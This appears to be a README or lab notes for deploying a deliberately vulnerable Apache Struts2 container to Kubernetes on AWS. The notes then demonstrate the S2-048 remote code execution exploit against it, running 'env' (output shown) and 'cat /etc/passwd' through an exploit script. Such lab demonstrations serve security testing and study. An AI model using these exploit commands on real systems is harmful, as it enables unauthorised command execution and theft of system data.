# struts_poc

git clone https://github.com/hook-s3c/apache-struts2-PoC

cd apache-struts2-PoC/

docker build -t struts .

docker run -it --rm -d -p 8080:8080 struts:latest

docker tag struts:latest public.ecr.aws/v9f6i2g3/stuff:latest

#public login to us-west-2 not supported by aws

aws ecr-public get-login-password --region us-east-1 | docker login --username AWS --password-stdin public.ecr.aws

docker push public.ecr.aws/v9f6i2g3/stuff:latest

kubectl apply -f strust-deploy-and-service.yaml

ubuntu@brett-jumpbox:~/apache-struts2-PoC$ !?get serv
kubectl get service -n struts
NAME     TYPE           CLUSTER-IP       EXTERNAL-IP                                                              PORT(S)          AGE
struts   LoadBalancer   10.100.144.108   a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com   8080:30524/TCP   153m
ubuntu@brett-jumpbox:~/apache-struts2-PoC$

ubuntu@brett-jumpbox:~/apache-struts2-PoC$ python exploitS2-048-cmd.py a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com:8080 'env'
[Execute]: env

KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
STRUTS_PORT_8080_TCP_PORT=8080
STRUTS_SERVICE_PORT=8080
HOSTNAME=struts-7d8c95bbbd-9p9pp
JAVA_HOME=/usr/local/openjdk-8
GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 713DA88BE50911535FE716F5208B0AB1D63011C7 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23
STRUTS_PORT=tcp://10.100.144.108:8080
PWD=/usr/local/tomcat
TOMCAT_SHA512=612e830913bf1401bc9540e2273e465b0ee7ef63750a9969a80f1e9da9edb4888aa621fcc6fa5ba23cff94a40e91eb97e3f969b8064dabd49b2d0ea29e59b57e
TOMCAT_MAJOR=7
HOME=/root
LANG=C.UTF-8
KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443
TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib
CATALINA_HOME=/usr/local/tomcat
STRUTS_PORT_8080_TCP_PROTO=tcp
SHLVL=0
KUBERNETES_PORT_443_TCP_PROTO=tcp
STRUTS_SERVICE_HOST=10.100.144.108
JDK_JAVA_OPTIONS= --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/java.util.concurrent=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
KUBERNETES_PORT_443_TCP_ADDR=10.100.0.1
LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib
KUBERNETES_SERVICE_HOST=10.100.0.1
KUBERNETES_PORT=tcp://10.100.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
PATH=/usr/local/tomcat/bin:/usr/local/openjdk-8/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TOMCAT_VERSION=7.0.109
STRUTS_PORT_8080_TCP=tcp://10.100.144.108:8080
JAVA_VERSION=8u292
STRUTS_PORT_8080_TCP_ADDR=10.100.144.108
_=/usr/bin/env

ubuntu@brett-jumpbox:~/apache-struts2-PoC$

curl 127.0.0.1:8080/showcase.action -v

#python3 -m venv .

python exploitS2-048-cmd.py 127.0.0.1:8080 'cat /etc/passwd'
![apache_struts_poc](https://user-images.githubusercontent.com/4404271/152885401-97a37adf-6aa8-4b97-847a-c665889b9b60.gif)
